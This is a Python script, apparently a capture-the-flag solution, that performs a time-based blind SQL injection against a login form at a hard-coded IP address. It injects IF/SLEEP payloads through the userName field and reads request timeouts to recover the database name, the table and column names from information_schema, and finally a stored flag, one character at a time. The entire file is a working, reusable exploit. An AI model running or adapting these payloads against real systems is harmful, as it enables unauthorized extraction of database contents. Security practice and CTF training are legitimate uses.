import requests
import time



urlname="http://213.133.103.186:7005/login" #http://CONTAINER_IP:CONTAINER_PORT/login

chars=["{","}","\_","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9","!"]#,">","<",":",";","!","@","_","-","+","?","$","#","&","=","*"]
#The underscore character ("_") is represented as "\_" because it is a wildcard in the SQL LIKE operator, so the square brackets are useful to make SQL interpret it literally.

len_db_name=1
while True:
        sql_injection="' OR 1=IF((SELECT LENGTH(database()))="+str(len_db_name)+", SLEEP(5), 1)#"
        print ("[+]Try: "+sql_injection)
        try:
            response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'},timeout=3)    #Random Password
        except:
            break
        len_db_name=len_db_name+1
print ("[Found]The length of the database name is: "+str(len_db_name))

i=0
db_name=""
while i<len_db_name:
    for name_char in chars:
        sql_injection="' OR 1=IF((SELECT database()) LIKE '"+str(db_name+name_char)+"%', SLEEP(5), 1)#"
        print ("[+]Try: "+sql_injection)
        try:
            response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'},timeout=3)  #Random Password
        except:
            db_name+=name_char
            break
    i=i+1
print ("[Found]The database name is: "+db_name)


tables_count=0
while True:
    sql_injection="' OR 1=IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())="+str(tables_count)+", SLEEP(5), 1)#"
    print ("[+]Try: "+sql_injection)
    try:
        response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'},timeout=3)  #Random Password
    except:
        break
    tables_count=tables_count+1
print ("[Found]The number of tables inside the database is: "+str(tables_count))

len_table1_name=1
while True:
        sql_injection="' OR 1=IF((SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)="+str(len_table1_name)+", SLEEP(5), 1)#"
        print ("[+]Try: "+sql_injection)
        try:
            response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'},timeout=3)    #Random Password
        except:
            break
        len_table1_name=len_table1_name+1
print ("[Found]The length of the first table name is: "+str(len_table1_name))

i=0
table1_name=""
while i<len_table1_name:
    for name_char in chars:
        sql_injection="' OR 1=IF((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) LIKE '"+str(table1_name+name_char)+"%', SLEEP(5), 1)#"
        print ("[+]Try: "+sql_injection)
        try:
            response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'},timeout=3)  #Random Password
        except:
            table1_name+=name_char
            break
    i=i+1
print ("[Found]The first table name is: "+table1_name) #The first table is 'Flags'!


table1_columns_count=1
while True:
        sql_injection="' OR 1=IF((SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='"+table1_name+"')="+str(table1_columns_count)+", SLEEP(5), 1)#"
        print ("[+]Try: "+sql_injection)
        try:
            response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'},timeout=3)    #Random Password
        except:
            break
        table1_columns_count=table1_columns_count+1
print ("[Found]The number of columns in the '"+table1_name+"' table is: "+str(table1_columns_count))

len_column2_name=1
while True:
        sql_injection="' OR 1=IF((SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='"+table1_name+"' LIMIT 1,1)="+str(len_column2_name)+", SLEEP(5), 1)#"
        print ("[+]Try: "+sql_injection)
        try:
            response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'},timeout=3)    #Random Password
        except:
            break
        len_column2_name=len_column2_name+1
print ("[Found]The length of the second column name of the '"+table1_name+"' table is: "+str(len_column2_name))

i=0
column2_name=""
while i<len_column2_name:
    for name_char in chars:
        sql_injection="' OR 1=IF((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='"+table1_name+"' LIMIT 1,1) LIKE '"+str(column2_name+name_char)+"%', SLEEP(5), 1)#"
        print ("[+]Try: "+sql_injection)
        try:
            response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'},timeout=3)  #Random Password
        except:
            column2_name+=name_char
            break
    i=i+1
print ("[Found]The name of the second column of the '"+table1_name+"' table is: "+column2_name) #Column's name: 'value'



len_flag=1
while True:
        sql_injection="' OR 1=IF((SELECT LENGTH("+column2_name+") FROM "+table1_name+" LIMIT 0,1)="+str(len_flag)+", SLEEP(10), 1)#"
        print ("[+]Try: "+sql_injection)
        try:
            response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'},timeout=5)    #Random Password
        except:
            break
        len_flag=len_flag+1
print ("[Found]The length of the flag is: "+str(len_flag))

i=0
flag_name=""
flag=""
while i<len_flag:
    for name_char in chars:
        sql_injection="' OR 1=IF((SELECT "+column2_name+" FROM "+table1_name+" LIMIT 0,1) LIKE '"+str(flag_name+name_char)+"%', SLEEP(12), 1)#"
        print ("[+]Try: "+sql_injection)
        try:
            response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'},timeout=10)  #Random Password
        except:
            flag_name+=name_char
            break
    i=i+1

flag=flag_name.replace("\_","_")
print ("[Found]The flag is: "+flag) #Flag
